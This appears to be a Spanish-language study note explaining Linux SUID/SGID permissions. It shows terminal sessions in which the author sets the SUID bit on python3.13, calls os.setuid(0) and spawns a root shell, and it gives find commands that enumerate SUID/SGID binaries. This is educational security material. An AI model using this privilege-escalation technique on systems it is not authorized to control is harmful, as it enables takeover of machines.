SUID y SGID son propiedades que nos permiten ejecutar ficheros con los permisos de su propietario por lo que los files que tengan esta propiedad activa y su owner tenga privilegios elevados puede ser un potencial riesgo. 
Ej con python 
```
┌──(alexandross㉿Alexandross)-[~/Desktop/Burpsuit Exercises]
└─$ ls -l /usr/bin/python3.13
.rwxr-xr-x root root 6.6 MB Wed Oct 15 16:56:22 2025 /usr/bin/python3.13
No tiene permiso s (SUID o GUID)

python3.13
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)    #Intentamos cambiar nuesto uid al de root, no lo admite
Traceback (most recent call last):
  File "<python-input-3>", line 1, in <module>
    os.setuid(0)
    ~~~~~~~~~^^^
PermissionError: [Errno 1] Operation not permitted
>>> os.system("whoami")
alexandross
0
>>> 

```

Lo agregaremos el permiso e intentaremos nuevamente

```
chmod u+s /usr/bin/python3.13    ||  chmod 4755 /usr/bin/python3.13

alexandross㉿Alexandross)-[~/Desktop/Burpsuit Exercises]
└─$ ls -l /usr/bin/python3.13
.rwsr-xr-x root root 6.6 MB Wed Oct 15 16:56:22 2025  /usr/bin/python3.13


┌──(alexandross㉿Alexandross)-[~/Desktop/Burpsuit Exercises]
└─$ python3.13
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> impot os
  File "<python-input-0>", line 1
    impot os
          ^^
SyntaxError: invalid syntax
>>> import os
>>> os.system("whoami")
alexandross
0
>>> os.setuid(0)         #Cambiamos el uid al de root
>>> os.system("whoami")
root
0
>>> os.system("id")
uid=0(root) gid=1000(alexandross) groups=1000(alexandross),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),133(kaboxer),134(docker),1001(promiscuous)
0
>>> os.system("bash")     #Obtenemos una bash con priviliegios de root
┌──(root㉿Alexandross)-[~/Desktop/Burpsuit Exercises]
└─# exit                                                                                                                                         
exit
0
>>> os.system("zsh")
┌──(root㉿Alexandross)-[~/Desktop/Burpsuit Exercises]
└─# whoami
root
                                                                                                                                                 
┌──(root㉿Alexandross)-[~/Desktop/Burpsuit Exercises]
└─# 

```

Esto también se puede realizar si el grupo tiene el permiso s agregado  causaria el mismo problema 

```
chmod g+s /usr/bin/python3.13    ||  chmod 2755 /usr/bin/python3.13
```

Una forma para encontrar binarios con este bit establecido es
```
find / -type f -perm -4000 2>/dev/null    #Bit s establesido en propietario 

find / -type f -perm -2000 2>/dev/null    #Bit s establesido en grupo
```

Cabe resaltar que hay fichero que lo tienen establecido y no repercuten ningún peligro conocido hasta el momento. 

Cuando agregamos el bit   s    y los ficheros no cuentan con permiso de ejecucion x cuando hagamos un ls se vera el permiso con   S    si lo tiene lo muestra como   s.

Lo mismo pasa con el stickibit 

Mas info
https://www.ochobitshacenunbyte.com/2019/06/17/permisos-especiales-en-linux-sticky-bit-suid-y-sgid/

https://deephacking.tech/permisos-sgid-suid-y-sticky-bit-linux/#:~:text=Permiso%20SGID,-El%20permiso%20SGID&text=Si%20se%20establece%20en%20un,perteneciente%2C%20el%20grupo%20del%20directorio.

https://www.ibiblio.org/pub/linux/docs/LuCaS/Manuales-LuCAS/SEGUNIX/unixsec-2.1-html/node56.html